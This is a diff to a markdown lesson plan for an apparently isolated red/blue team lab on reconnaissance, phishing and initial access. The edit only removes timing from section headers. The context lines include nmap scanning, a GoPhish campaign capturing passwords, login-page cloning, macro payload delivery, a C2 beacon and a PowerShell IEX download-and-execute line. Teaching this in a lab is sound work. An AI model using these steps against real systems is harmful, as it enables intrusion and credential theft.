@@ -1,5 +1,5 @@
 # Lesson 1 — Reconnaissance, Initial Access & Phishing
-## 2-Hour Hands-On Lab
+## Hands-On Lab
 
 ```
 Kali (attacker)   192.168.11.149
@@ -9,7 +9,7 @@ Lab domain        acmecorp-it.lab  →  192.168.11.149
 
 ---
 
-## Pre-Lab — Setup  `[00:00 – 00:15]` · 15 min
+## Pre-Lab — Setup
 
 ```bash
 # Clone the repo onto Kali
@@ -39,7 +39,7 @@ Open **4 terminals** on Kali now — each module below says which terminal to us
 
 ---
 
-## Phase 1 — Passive Recon (OSINT)  `[00:15 – 00:30]` · 15 min
+## Phase 1 — Passive Recon (OSINT)
 
 > No packets touch the victim. Zero logs generated on their side.
 
@@ -93,7 +93,7 @@ https://www.shodan.io/search?query=org%3A%22Acme+Corp%22+port%3A3389
 
 ---
 
-## Phase 2 — Active Recon (Network Scanning)  `[00:30 – 00:45]` · 15 min
+## Phase 2 — Active Recon (Network Scanning)
 
 > **Blue team:** start Wireshark now → filter `ip.src == 192.168.11.149`
 
@@ -143,7 +143,7 @@ sudo nmap -A -T4 $VICTIM
 
 ---
 
-## Phase 3 — Start Attack Infrastructure  `[00:45 – 00:50]` · 5 min
+## Phase 3 — Start Attack Infrastructure
 
 Start these in three separate terminals and leave them running for the rest of the lesson.
 
@@ -169,7 +169,7 @@ python3 tools/http_server.py
 
 ---
 
-## Phase 4 — Phishing Campaign (GoPhish)  `[00:50 – 01:20]` · 30 min
+## Phase 4 — Phishing Campaign (GoPhish)
 
 Open **https://127.0.0.1:3333** in your browser. Follow these steps.
 
@@ -284,7 +284,7 @@ Click "Submitted Data" to view: username · password
 
 ---
 
-## Phase 5 — Fake Login Page / Site Cloning  `[01:20 – 01:30]` · 10 min
+## Phase 5 — Fake Login Page / Site Cloning
 
 **Terminal 4**
 
@@ -318,7 +318,7 @@ Show students side-by-side: real site vs cloned — they look identical.
 
 ---
 
-## Phase 6 — Payload Delivery  `[01:30 – 01:45]` · 15 min
+## Phase 6 — Payload Delivery
 
 ### 6-A · Macro document (concept + demo)
 
@@ -385,7 +385,7 @@ IEX (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
 
 ---
 
-## Phase 7 — C2 Beacon  `[01:45 – 01:52]` · 7 min
+## Phase 7 — C2 Beacon
 
 **On Windows victim:**
 ```powershell
@@ -422,7 +422,7 @@ Watch **Terminal 3** — every 10 seconds:
 
 ---
 
-## Phase 8 — Blue Team Investigation  `[01:52 – 02:10]` · 18 min
+## Phase 8 — Blue Team Investigation
 
 Students switch roles. Kali terminals stay running. All commands run **on Windows victim.**
 
